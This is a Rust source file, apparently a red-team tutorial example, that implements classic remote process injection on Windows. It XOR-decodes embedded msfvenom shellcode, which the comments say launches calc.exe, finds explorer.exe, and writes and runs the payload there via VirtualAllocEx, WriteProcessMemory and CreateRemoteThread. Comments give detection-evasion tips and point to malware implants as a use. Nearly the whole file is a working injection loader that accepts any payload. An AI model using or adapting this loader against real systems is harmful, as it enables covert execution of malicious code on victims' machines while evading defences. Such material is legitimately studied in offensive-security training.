// Specify that we want to use the 'windows_sys' crate, which provides Rust bindings to Windows APIs
// It is good practice to further specify the imports for each API type that we want to use to limit clutter in our code.

use std::ptr;
use sysinfo::{PidExt, ProcessExt, System, SystemExt}; // For enumerating processes
use windows_sys::Win32::{
    Foundation::*,
    System::{Diagnostics::Debug::*, Memory::*, Threading::*},
};

/* old
// Helper function to XOR our shellcode in-place
fn xor_array(array: &mut [u8], key: u8) -> () {
    for byte in array {
        *byte ^= key;
    }
}
*/

// Helper function to XOR our shellcode in-place
fn xor_array(array: &mut [u8], key: &[u8]) {
    // Iterate over both the array and the key simultaneously
    for (byte, &k) in array.iter_mut().zip(key.iter().cycle()) {
        *byte ^= k; // Perform XOR operation
    }
}

// Note the use of `&`, denoting a reference to the shellcode rather than a copy (#JustRustThings)
fn inject_remote(shellcode: &[u8], process_id: u32) {
    //need to specify unsafe to tell Rust we're okay with managing memory directly
    unsafe {
        // Get a handle on the target process in order to interact with it
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
        println!("[+] Got target process handle: {:?}", process_handle);
        // Allocate RW (read-write) memory
        // Opsec tip: RWX memory can easily be detected. Consider making memory RW first, then RX after writing your shellcode like the following
        let allocated_memory = VirtualAllocEx(
            process_handle,           //process handle
            ptr::null_mut(),          // Address to start allocation from. Null means 'anywhere'
            shellcode.len(),          // Size of allocation
            MEM_COMMIT | MEM_RESERVE, // Allocate memory immediately
            PAGE_READWRITE,           // Memory protection flags
        );

        if allocated_memory.is_null() {
            panic!("Failed to allocate memory.");
        }

        println!(
            "[+] Allocated RX memory in remote process at address {:?}",
            allocated_memory
        );

        // Write the payload to the allocated bytes in the remote process
        let mut bytes_written = 0;
        WriteProcessMemory(
            process_handle,
            allocated_memory,
            shellcode.as_ptr() as _, // Get the raw pointer to our shellcode buffer
            shellcode.len(),
            &mut bytes_written,
        );

        println!("[+] Wrote {} bytes to remote process memory", bytes_written);

        // Change the memory protection to RX (read-execute)
        let mut old_protect = 0;

        let mem_protect = VirtualProtectEx(
            process_handle,
            allocated_memory,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if mem_protect == 0 {
            panic!("Failed to change memory protection.");
        }

        // Create a thread at the start of the executable shellcode to run it!
        // We use the 'transmute' function to convert our pointer to a function pointer

        let thread_handle = CreateRemoteThread(
            process_handle,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(allocated_memory)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );
        println!("[+] Created remote thread!");

        // Wait for our thread to exit to prevent program from closing before the shellcode ends
        // This is especially relevant for long-running shellcode, such as malware implants
        WaitForSingleObject(thread_handle, INFINITE);

        // cleanup

        // Normally Rust is quite good at memory management, but since we are doing unsafe WinAPI stuff we have to clean up after ourselves
        // In this case, we free the memory we allocated earlier and close the thread handle
        // Free the allocated memory
        VirtualFreeEx(
            process_handle,
            allocated_memory,
            0, // Set dwSize to 0 to release the entire region allocated
            MEM_RELEASE,
        );

        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    }
}

// Our main function, required as an entrypoint in Rust
fn main() {
    // Define our shellcode as an array of 'u8' (unsigned 8-bit integers)
    // msfvenom -p windows/x64/exec CMD="C:\windows\system32\calc.exe" EXITFUNC=thread -f rust
    // ↓xored shellcode↓
    let mut shellcode: &mut [u8] = &mut[ 0x8f, 0x21, 0xee, 0x94, 0x9c, 0x8d, 0xb8, 0x6f, 0x72, 0x73, 0x28, 0x3c, 0x31, 0x3c, 0x37, 0x29, 0x39, 0x3a, 0x42, 0xbb, 0x08, 0x38, 0xe7, 0x37, 0x18, 0x27, 0xf9, 0x21, 0x71, 0x25, 0xfb, 0x3e, 0x45, 0x30, 0xe4, 0x00, 0x23, 0x21, 0x62, 0xc7, 0x26, 0x2f, 0x35, 0x5e, 0xbb, 0x3b, 0x58, 0xad, 0xdc, 0x50, 0x04, 0x04, 0x6d, 0x5e, 0x53, 0x28, 0xac, 0xb9, 0x61, 0x24, 0x79, 0xae, 0x90, 0x9e, 0x3b, 0x2c, 0x21, 0x24, 0xee, 0x2a, 0x4f, 0xf9, 0x31, 0x55, 0x25, 0x71, 0xbc, 0xee, 0xf8, 0xe7, 0x72, 0x73, 0x69, 0x25, 0xf5, 0xac, 0x11, 0x1f, 0x27, 0x73, 0xa3, 0x39, 0xe6, 0x38, 0x74, 0x21, 0xf3, 0x2f, 0x52, 0x3a, 0x68, 0xbd, 0x93, 0x3a, 0x2d, 0x87, 0xa6, 0x33, 0xf8, 0x5d, 0xe5, 0x38, 0x6d, 0xb3, 0x35, 0x5e, 0xbb, 0x3b, 0x58, 0xad, 0xdc, 0x2d, 0xa4, 0xb1, 0x62, 0x33, 0x72, 0xa8, 0x55, 0x90, 0x19, 0x94, 0x34, 0x6c, 0x3e, 0x57, 0x61, 0x28, 0x49, 0xbd, 0x10, 0xa0, 0x37, 0x36, 0xf8, 0x29, 0x49, 0x39, 0x6d, 0xb5, 0x1e, 0x2e, 0xf9, 0x7f, 0x21, 0x29, 0xfb, 0x2c, 0x79, 0x31, 0x6e, 0xa2, 0x32, 0xe2, 0x69, 0xf8, 0x24, 0x64, 0xa8, 0x2e, 0x2a, 0x32, 0x31, 0x33, 0x29, 0x36, 0x24, 0x20, 0x2e, 0x2b, 0x32, 0x33, 0x25, 0xf3, 0x80, 0x45, 0x39, 0x3d, 0x8d, 0x93, 0x31, 0x2c, 0x29, 0x36, 0x2d, 0xf3, 0x7d, 0x9b, 0x24, 0x96, 0x92, 0x8f, 0x31, 0x2d, 0xc2, 0x6e, 0x72, 0x73, 0x69, 0x6d, 0x70, 0x6c, 0x65, 0x30, 0xe2, 0xff, 0x72, 0x68, 0x6d, 0x70, 0x2d, 0xdf, 0x49, 0xe4, 0x1d, 0xf4, 0x96, 0xb8, 0xcb, 0x8c, 0x78, 0x52, 0x65, 0x33, 0xc9, 0xcf, 0xf8, 0xcd, 0xf1, 0x9a, 0xad, 0x27, 0xf1, 0xb7, 0x41, 0x51, 0x76, 0x10, 0x6f, 0xf8, 0x94, 0x92, 0x06, 0x6c, 0xd6, 0x37, 0x7f, 0x17, 0x17, 0x05, 0x72, 0x2a, 0x28, 0xe4, 0xaa, 0x93, 0xb0, 0x1b, 0x0e, 0x1e, 0x10, 0x47, 0x08, 0x08, 0x09, 0x65 ];

    let xor_key = b"simplexor";

    xor_array(&mut shellcode, xor_key);

    // Find the "explorer.exe" process ID by its name using the 'sysinfo' crate
    let s = System::new_all();
    let process_id: u32 = s
        .processes_by_name("explorer")
        .next() // Get only the first result
        .unwrap() // Unwrap the result, panic if an error occurs
        .pid() // Get the process ID
        .as_u32(); // Convert the process ID to an unsigned, 32-bit integer
    println!("[+] Found explorer.exe with PID {}", process_id);

    inject_remote(&shellcode, process_id); // Note the use of `&`, denoting a reference to the shellcode rather than a copy (#JustRustThings)
}
